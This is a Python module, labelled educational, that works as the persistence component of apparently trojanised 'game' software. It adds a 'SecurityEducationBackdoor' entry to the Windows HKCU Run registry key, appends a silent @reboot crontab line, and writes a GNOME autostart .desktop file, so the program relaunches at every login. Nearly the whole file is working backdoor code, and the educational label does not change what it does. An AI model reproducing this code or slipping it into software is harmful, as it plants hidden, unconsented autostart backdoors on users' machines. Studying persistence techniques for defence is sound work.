"""
Persistence Manager Module
Educational demonstration of persistence mechanisms
"""

import os
import sys
import platform
import subprocess

class PersistenceManager:
    def __init__(self):
        self.system = platform.system()
        self.game_path = os.path.abspath(sys.argv[0])
        
    def setup(self):
        """Setup persistence based on OS"""
        print("[*] Setting up educational persistence demonstration...")
        
        if self.system == "Windows":
            self.setup_windows_persistence()
        elif self.system == "Linux":
            self.setup_linux_persistence()
        else:
            print("[!] Unsupported OS for persistence demonstration")
            
    def setup_windows_persistence(self):
        """Windows persistence via registry (educational)"""
        try:
            import winreg
            
            print("[*] Adding entry to HKCU Run registry key...")
            
            # Open registry key
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                key_path,
                0,
                winreg.KEY_SET_VALUE
            )
            
            # Set value
            value_name = "SecurityEducationBackdoor"
            value_data = f'"{sys.executable}" "{self.game_path}"'
            
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
            winreg.CloseKey(key)
            
            print(f"[✓] Persistence added: {value_name}")
            print(f"[*] This will run the game at every login")
            print("[*] (Educational demonstration only)")
            
        except ImportError:
            print("[!] winreg module not available")
        except Exception as e:
            print(f"[!] Failed to setup Windows persistence: {e}")
            
    def setup_linux_persistence(self):
        """Linux persistence via crontab or autostart (educational)"""
        try:
            # Method 1: Crontab
            print("[*] Adding entry to crontab...")
            
            cron_cmd = f"@reboot {sys.executable} {self.game_path} >/dev/null 2>&1 & # EducationalBackdoor\n"
            
            # Get current crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            # Check if already exists
            if self.game_path not in current_cron:
                new_cron = current_cron + cron_cmd
                
                # Write new crontab
                proc = subprocess.run(['crontab', '-'], input=new_cron, text=True)
                if proc.returncode == 0:
                    print("[✓] Added to crontab")
                else:
                    print("[!] Failed to add to crontab")
                    
            # Method 2: Autostart directory
            print("[*] Adding to autostart directory...")
            
            autostart_dir = os.path.expanduser("~/.config/autostart")
            desktop_file = os.path.join(autostart_dir, "security-education.desktop")
            
            # Create autostart directory if it doesn't exist
            os.makedirs(autostart_dir, exist_ok=True)
            
            # Create desktop entry
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=Security Education
Exec={sys.executable} {self.game_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            with open(desktop_file, 'w') as f:
                f.write(desktop_content)
                
            print("[✓] Added to autostart")
            
        except Exception as e:
            print(f"[!] Failed to setup Linux persistence: {e}")
            
    def get_persistence_locations(self):
        """Return list of persistence locations for cleanup"""
        if self.system == "Windows":
            return [('registry', r'Software\Microsoft\Windows\CurrentVersion\Run')]
        elif self.system == "Linux":
            return [
                ('crontab', 'crontab -l'),
                ('autostart', '~/.config/autostart/security-education.desktop')
            ]
        return []